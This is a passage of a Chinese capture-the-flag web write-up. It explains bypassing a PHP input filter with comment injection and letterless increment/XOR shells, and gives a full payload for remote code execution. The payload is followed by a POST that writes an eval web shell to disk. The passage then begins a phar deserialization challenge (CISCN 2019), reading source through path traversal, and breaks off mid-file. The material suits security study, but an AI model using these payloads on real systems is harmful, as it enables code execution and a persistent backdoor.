&amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;</span></span><br><span class="line"><span class="meta">echo($_COOKIE[&#x27;user&#x27;]);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">else&#123;</span></span><br><span class="line"><span class="meta">die(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;sitting_btn&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>系统设置<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;help_btn&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>使用指南 <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;about_btn&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>关于我们<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;logout_btn&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>退出系统<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;powered_by&quot;</span>&gt;</span>__PUNC__<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;deskIcon&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;desktop_icon&quot;</span> <span class="attr">id</span>=<span class="string">&quot;win5&quot;</span> <span class="attr">path</span>=<span class="string">&quot;https://image.baidu.com/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../img/icon4.png&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text&quot;</span>&gt;</span>图片</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right_cron&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;desktop_icon&quot;</span> <span class="attr">id</span>=<span class="string">&quot;win6&quot;</span> <span class="attr">path</span>=<span class="string">&quot;http://www.4399.com/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../img/icon5.png&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text&quot;</span>&gt;</span>游戏</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right_cron&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;desktop_icon&quot;</span> <span class="attr">id</span>=<span class="string">&quot;win10&quot;</span> <span class="attr">path</span>=<span class="string">&quot;../get_pic.php?image=img/haokangde.png&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../img/icon4.png&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>好康的<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right_cron&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;desktop_icon&quot;</span> <span class="attr">id</span>=<span class="string">&quot;win16&quot;</span> <span class="attr">path</span>=<span class="string">&quot;__WEBSITE__&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../img/icon10.png&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>你的网站<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里<code>$_POST['punctuation']</code>的长度限制为1000,其他的都很短，说明可能要利用这个点，原本想的是在<code>__PUNC__</code>的地方替换为<code>&lt;script language=php&gt;</code>来执行php语句，但是php7后就不再支持这样弄了，这里只有上面有<code>&lt;?php</code>，所以我们要利用上面的那个<code>&lt;?php</code>标志来执行语句</p><p>回到<code>index.php</code>看一下过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>tips：不确定正则过滤后的可用可见字符时，可写脚本判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//自增rce</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$pass</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前能过waf的字符：&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">#当前能过waf的字符： $()+,.0123456789;=[]_&#123;&#125;</span></span><br></pre></td></tr></table></figure></blockquote><p>其含义为<code>user</code>必须以指定符号开头，<code>website</code>相似，<code>punctuation</code>不能包含数字字母以及<code>&gt;</code>、<code>?</code></p><p>由于index.php文件是对<code>__USER__</code>等字符串进行的替换，所以我们可以使用多行注释，将下面的内容都注释掉<br>然后在<code>__PUNC__</code>的地方进行闭合，这样就能继续利用上面的php标志来执行php语句了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例</span></span><br><span class="line"><span class="variable">$a</span>=((<span class="keyword">string</span>)<span class="comment">/*);</span></span><br><span class="line"><span class="comment">    asdasd</span></span><br><span class="line"><span class="comment">asdasda</span></span><br><span class="line"><span class="comment">asdasdasd</span></span><br><span class="line"><span class="comment">asdasd8*/</span>[]);<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure><p>由于过滤了数字字母以及<code>&gt;</code>、<code>?</code>，所以要使用无字母shell，利用自增和异或均可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;&#x27;</span>.[];<span class="comment">//获得字符串Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"><span class="comment">//ASSERT[$_POST[_]]</span></span><br></pre></td></tr></table></figure><p>异或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;($((%-&#x27;</span>^<span class="string">&#x27;[][\@@&#x27;</span>;<span class="variable">$__</span>=<span class="string">&#x27;#:%(&#x27;</span>^<span class="string">&#x27;|&#125;`|&#x27;</span>;<span class="variable">$___</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$__</span>;<span class="keyword">echo</span> <span class="variable">$___</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="comment"># system($_GET[&#x27;1&#x27;]);</span></span><br></pre></td></tr></table></figure><p>源代码中<code>$user = ((string)__USER__);</code>，<code>(string)</code>后面必须要有内容，否则会报错</p><p>用如下payload：<code>$_POST['punctuationcode></p><p>报错是因为后面的<code>html</code>标签解析错误，用注释符<code>/*</code>注释掉即可，所以会爆warn（因为注释符没闭合）,但是warn不会影响代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USERNAME:</span><br><span class="line">/*</span><br><span class="line">PASSWORD:</span><br><span class="line">(any)</span><br><span class="line">YOURWEBSIT:</span><br><span class="line">(any)</span><br><span class="line">YOURPUNCTUATION:</span><br><span class="line">*/[]);$_=&#x27;&#x27;.[];$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*</span><br></pre></td></tr></table></figure><p><code>POST: _=file_put_contents('shell.php','&lt;?php eval($_POST[1]);?&gt;');</code></p><p>蚁剑连接读取<code>flag</code>即可</p><h2 id="ciscn-2019华北day1-web1">[CISCN 2019华北Day1]Web1</h2><p><strong>考点</strong>：<code>phar反序列化</code></p><p>原理、影响函数及利用条件参考<a href="https://blog.csdn.net/unexpectedthing/article/details/122930867">这篇</a></p><p>进入题目正常注册登录，随便上传一个文件，发现还有删除和下载两个功能点，利用下载读取源码</p><p><img src="https://www.z4a.net/images/2024/05/05/823a4c36deaf1457d5b50b9f3f8dc9d4.png" alt="823a4c36deaf1457d5b50b9f3f8dc9d4"></p><blockquote><p>这里用绝对路径，也可以用相对路径<code>../../index.php</code>，之所以用两个<code>../</code>在知道源码的情况下是因为在执行<code>download.php</code>时会进入<code>uploads/sandbox/</code>文件夹</p></blockquote><p>按照已发现的功能获取以下文件源码<code>delete.php</code> <code>index.php</code> <code>register.php</code> <code>login.php</code> <code>upload.php</code> <code>class.php</code></p><h3 id="class-php"><code>class.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 